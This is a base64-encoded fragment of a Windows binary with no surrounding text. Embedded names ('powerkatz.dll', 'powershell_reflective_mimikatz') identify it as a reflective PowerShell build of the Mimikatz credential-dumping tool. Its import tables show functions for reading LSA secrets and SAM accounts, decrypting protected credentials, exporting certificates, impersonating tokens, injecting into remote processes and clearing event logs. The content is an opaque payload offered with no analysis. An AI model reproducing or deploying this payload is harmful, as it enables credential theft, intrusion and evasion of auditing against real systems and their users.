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aW9uUG9saWN5AIMAQ3JlYXRlV2VsbEtub3duU2lkAAB8AENyZWF0ZVByb2Nlc3NBc1VzZXJXAAB9AENyZWF0ZVByb2Nlc3NXaXRoTG9nb25XAG4CUmVnUXVlcnlWYWx1ZUV4VwAAUgJSZWdFbnVtVmFsdWVXAGECUmVnT3BlbktleUV4VwB+AlJlZ1NldFZhbHVlRXhXAABPAlJlZ0VudW1LZXlFeFcAaAJSZWdRdWVyeUluZm9LZXlXAAAwAlJlZ0Nsb3NlS2V5AO0CU3lzdGVtRnVuY3Rpb24wMzIAKQJRdWVyeVNlcnZpY2VTdGF0dXNFeAAA+wFPcGVuU2VydmljZVcAAMkCU3RhcnRTZXJ2aWNlVwBcAENvbnRyb2xTZXJ2aWNlAADaAERlbGV0ZVNlcnZpY2UA+QFPcGVuU0NNYW5hZ2VyVwAAVwBDbG9zZVNlcnZpY2VIYW5kbGUAAGwAQ29udmVydFNpZFRvU3RyaW5nU2lkVwAAwQBDcnlwdEdlblJhbmRvbQAAgAFJc1RleHRVbmljb2RlAFoBR2V0VG9rZW5JbmZvcm1hdGlvbgCRAUxvb2t1cEFjY291bnRTaWRXAPcBT3BlblByb2Nlc3NUb2tlbgAAdABDb252ZXJ0U3RyaW5nU2lkVG9TaWRXAADTAlN5c3RlbUZ1bmN0aW9uMDA2AL4AQ3J5cHRFbnVtUHJvdmlkZXJzVwDHAENyeXB0R2V0VXNlcktleQD2AU9wZW5FdmVudExvZ1cAUwBDbGVhckV2ZW50TG9nVwAAQwFHZXROdW1iZXJPZkV2ZW50TG9nUmVjb3JkcwAAJwJRdWVyeVNlcnZpY2VPYmplY3RTZWN1cml0eQAAQwBCdWlsZFNlY3VyaXR5RGVzY3JpcHRvclcAACABRnJlZVNpZAC/AlNldFNlcnZpY2VPYmplY3RTZWN1cml0eQAAIABBbGxvY2F0ZUFuZEluaXRpYWxpemVTaWQAAIEAQ3JlYXRlU2VydmljZVcAAOYCU3lzdGVtRnVuY3Rpb24wMjUAzAFMc2FSZXRyaWV2ZVByaXZhdGVEYXRhAADJAUxzYVF1ZXJ5VHJ1c3RlZERvbWFpbkluZm9CeU5hbWUA0gJTeXN0ZW1GdW5jdGlvbjAwNQBXAUdldFNpZFN1YkF1dGhvcml0eQAAWAFHZXRTaWRTdWJBdXRob3JpdHlDb3VudACqAUxzYUVudW1lcmF0ZVRydXN0ZWREb21haW5zRXgAAKsBTHNhRnJlZU1lbW9yeQD8AU9wZW5UaHJlYWRUb2tlbgDfAER1cGxpY2F0ZVRva2VuRXgAAFEAQ2hlY2tUb2tlbk1lbWJlcnNoaXAAAMECU2V0VGhyZWFkVG9rZW4AAIwAQ3JlZEZyZWUAAIkAQ3JlZEVudW1lcmF0ZVcAAEFEVkFQSTMyLmRsbAAA1gBDcnlwdFVucHJvdGVjdERhdGEAAHsAQ3J5cHRCaW5hcnlUb1N0cmluZ1cAALoAQ3J5cHRQcm90ZWN0RGF0YQAAeQBDcnlwdEFjcXVpcmVDZXJ0aWZpY2F0ZVByaXZhdGVLZXkACABDZXJ0QWRkRW5jb2RlZENlcnRpZmljYXRlVG9TdG9yZQAAQABDZXJ0RnJlZUNlcnRpZmljYXRlQ29udGV4dAAALwBDZXJ0RW51bVN5c3RlbVN0b3JlAAQAQ2VydEFkZENlcnRpZmljYXRlQ29udGV4dFRvU3RvcmUAACwAQ2VydEVudW1DZXJ0aWZpY2F0ZXNJblN0b3JlABIAQ2VydENsb3NlU3RvcmUAABABUEZYRXhwb3J0Q2VydFN0b3JlRXgAAGoAQ2VydFNldENlcnRpZmljYXRlQ29udGV4dFByb3BlcnR5AEsAQ2VydEdldE5hbWVTdHJpbmdXAABXAENlcnRPcGVuU3RvcmUARgBDZXJ0R2V0Q2VydGlmaWNhdGVDb250ZXh0UHJvcGVydHkAQ1JZUFQzMi5kbGwADABNRDVJbml0AA0ATUQ1VXBkYXRlAAsATUQ1RmluYWwAAAUAQ0RMb2NhdGVDU3lzdGVtAAQAQ0RHZW5lcmF0ZVJhbmRvbUJpdHMAAAYAQ0RMb2NhdGVDaGVja1N1bQAAY3J5cHRkbGwuZGxsAAAQAERzR2V0RGNOYW1lVwAAZQBOZXRBcGlCdWZmZXJGcmVlAABORVRBUEkzMi5kbGwAAAcARHNCaW5kVwBmAERzVW5CaW5kVwABAERzQWRkU2lkSGlzdG9yeVcAAE5URFNBUEkuZGxsAHkBUnBjQmluZGluZ1NldE9wdGlvbgBnAVJwY0JpbmRpbmdGcm9tU3RyaW5nQmluZGluZ1cAAPYBUnBjU3RyaW5nQmluZGluZ0NvbXBvc2VXAAB2AVJwY0JpbmRpbmdTZXRBdXRoSW5mb0V4VwAA+gFScGNTdHJpbmdGcmVlVwAAZQFScGNCaW5kaW5nRnJlZQAAIABJX1JwY0JpbmRpbmdJbnFTZWN1cml0eUNvbnRleHQAAJYATmRyQ2xpZW50Q2FsbDMAAFJQQ1JUNC5kbGwAADoAUGF0aENvbWJpbmVXAAA4AFBhdGhDYW5vbmljYWxpemVXAGUAUGF0aElzUmVsYXRpdmVXAFNITFdBUEkuZGxsABMAU2FtRW51bWVyYXRlVXNlcnNJbkRvbWFpbgAdAFNhbUxvb2t1cE5hbWVzSW5Eb21haW4AAB8AU2FtT3BlbkRvbWFpbgAhAFNhbU9wZW5Vc2VyABwAU2FtTG9va3VwSWRzSW5Eb21haW4AAAcAU2FtQ29ubmVjdAAABgBTYW1DbG9zZUhhbmRsZQAAFABTYW1GcmVlTWVtb3J5ACYAU2FtUXVlcnlJbmZvcm1hdGlvblVzZXIAEQBTYW1FbnVtZXJhdGVEb21haW5zSW5TYW1TZXJ2ZXIAACwAU2FtUmlkVG9TaWQAFQBTYW1HZXRBbGlhc01lbWJlcnNoaXAAGwBTYW1Mb29rdXBEb21haW5JblNhbVNlcnZlcgAAGABTYW1HZXRHcm91cHNGb3JVc2VyAFNBTUxJQi5kbGwAABgARnJlZUNvbnRleHRCdWZmZXIANABRdWVyeUNvbnRleHRBdHRyaWJ1dGVzVwAnAExzYUNvbm5lY3RVbnRydXN0ZWQAKABMc2FEZXJlZ2lzdGVyTG9nb25Qcm9jZXNzACYATHNhQ2FsbEF1dGhlbnRpY2F0aW9uUGFja2FnZQAALQBMc2FMb29rdXBBdXRoZW50aWNhdGlvblBhY2thZ2UAACoATHNhRnJlZVJldHVybkJ1ZmZlcgBTZWN1cjMyLmRsbAAGAENvbW1hbmRMaW5lVG9Bcmd2VwAAU0hFTEwzMi5kbGwAxwFJc0NoYXJBbHBoYU51bWVyaWNXAEABR2V0S2V5Ym9hcmRMYXlvdXQAVVNFUjMyLmRsbAAABQBIaWREX0dldEhpZEd1aWQAAQBIaWREX0ZyZWVQcmVwYXJzZWREYXRhAAAMAEhpZERfR2V0UHJlcGFyc2VkRGF0YQAVAEhpZFBfR2V0Q2FwcwAAAgBIaWREX0dldEF0dHJpYnV0ZXMAAEhJRC5ETEwAPwFTZXR1cERpRGVzdHJveURldmljZUluZm9MaXN0AABDAVNldHVwRGlFbnVtRGV2aWNlSW50ZXJmYWNlcwBWAVNldHVwRGlHZXRDbGFzc0RldnNXAABuAVNldHVwRGlHZXREZXZpY2VJbnRlcmZhY2VEZXRhaWxXAABTRVRVUEFQSS5kbGwAAA0AUnRsRnJlZUFuc2lTdHJpbmcAFwBSdGxVbmljb2RlU3RyaW5nVG9BbnNpU3RyaW5nAAAOAFJ0bEZyZWVVbmljb2RlU3RyaW5nAAAKAFJ0bERvd25jYXNlVW5pY29kZVN0cmluZwAADABSdGxFcXVhbFVuaWNvZGVTdHJpbmcAEwBSdGxJbml0VW5pY29kZVN0cmluZwAAAQBOdFF1ZXJ5T2JqZWN0AAIATnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uAAAAAE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MAEABSdGxHZXRDdXJyZW50UGViAAAJAFJ0bENyZWF0ZVVzZXJUaHJlYWQADwBSdGxHVUlERnJvbVN0cmluZwAWAFJ0bFN0cmluZ0Zyb21HVUlEABEAUnRsR2V0TnRWZXJzaW9uTnVtYmVycwAACABSdGxBcHBlbmRVbmljb2RlU3RyaW5nVG9TdHJpbmcAABkAUnRsVXBjYXNlVW5pY29kZVN0cmluZwAABwBSdGxBbnNpU3RyaW5nVG9Vbmljb2RlU3RyaW5nAAADAE50UmVzdW1lUHJvY2VzcwAGAFJ0bEFkanVzdFByaXZpbGVnZQAABQBOdFRlcm1pbmF0ZVByb2Nlc3MAAAQATnRTdXNwZW5kUHJvY2VzcwAACwBSdGxFcXVhbFN0cmluZwAAbnRkbGwuZGxsAEYDTG9jYWxBbGxvYwAAKwFGaWxlVGltZVRvU3lzdGVtVGltZQAASgNMb2NhbEZyZWUAwwNSZWFkRmlsZQAANAVXcml0ZUZpbGUAjwBDcmVhdGVGaWxlVwDABFNsZWVwAAgCR2V0TGFzdEVycm9yAADPBFRlcm1pbmF0ZVRocmVhZABSAENsb3NlSGFuZGxlALQAQ3JlYXRlVGhyZWFkAAD4AUdldEZpbGVTaXplRXgAxQFHZXRDdXJyZW50RGlyZWN0b3J5VwAAXQFGbHVzaEZpbGVCdWZmZXJzAADGAUdldEN1cnJlbnRQcm9jZXNzAOwARHVwbGljYXRlSGFuZGxlAIIDT3BlblByb2Nlc3MA4QBEZXZpY2VJb0NvbnRyb2wAPQVXcml0ZVByb2Nlc3NNZW1vcnkAAP4EVmlydHVhbFByb3RlY3QAAPsEVmlydHVhbEZyZWUA+ARWaXJ0dWFsQWxsb2MAAHQEU2V0RmlsZVBvaW50ZXIAAP8EVmlydHVhbFByb3RlY3RFeAAA+QRWaXJ0dWFsQWxsb2NFeAAAxgNSZWFkUHJvY2Vzc01lbW9yeQD8BFZpcnR1YWxGcmVlRXgAAAVWaXJ0dWFsUXVlcnkAAAEFVmlydHVhbFF1ZXJ5RXgAAOUEVW5tYXBWaWV3T2ZGaWxlAIwAQ3JlYXRlRmlsZU1hcHBpbmdXAABZA01hcFZpZXdPZkZpbGUATQNMb2NhbFJlQWxsb2MAAKgAQ3JlYXRlUHJvY2Vzc1cAAIAEU2V0TGFzdEVycm9yAAAIBVdhaXRGb3JTaW5nbGVPYmplY3QAqQBDcmVhdGVSZW1vdGVUaHJlYWQAACoBRmlsZVRpbWVUb0xvY2FsRmlsZVRpbWUAngJHZXRUaW1lRm9ybWF0VwAAzwFHZXREYXRlRm9ybWF0VwAAPwFGaW5kRmlyc3RGaWxlVwAASwFGaW5kTmV4dEZpbGVXADQBRmluZENsb3NlAPEBR2V0RmlsZUF0dHJpYnV0ZXNXAACAAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAEEDTG9hZExpYnJhcnlXAABMAkdldFByb2NBZGRyZXNzAABoAUZyZWVMaWJyYXJ5AB4CR2V0TW9kdWxlSGFuZGxlVwAAuAFHZXRDb25zb2xlU2NyZWVuQnVmZmVySW5mbwAAawJHZXRTdGRIYW5kbGUAAC4BRmlsbENvbnNvbGVPdXRwdXRDaGFyYWN0ZXJXAFsEU2V0Q3VycmVudERpcmVjdG9yeVcAAD8EU2V0Q29uc29sZUN1cnNvclBvc2l0aW9uAADKAUdldEN1cnJlbnRUaHJlYWQAAMcBR2V0Q3VycmVudFByb2Nlc3NJZACpA1F1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyAMsBR2V0Q3VycmVudFRocmVhZElkAADvAkluaXRpYWxpemVTTGlzdEhlYWQAGARSdGxDYXB0dXJlQ29udGV4dAAfBFJ0bExvb2t1cEZ1bmN0aW9uRW50cnkAACYEUnRsVmlydHVhbFVud2luZAAAAgNJc0RlYnVnZ2VyUHJlc2VudADiBFVuaGFuZGxlZEV4Y2Vw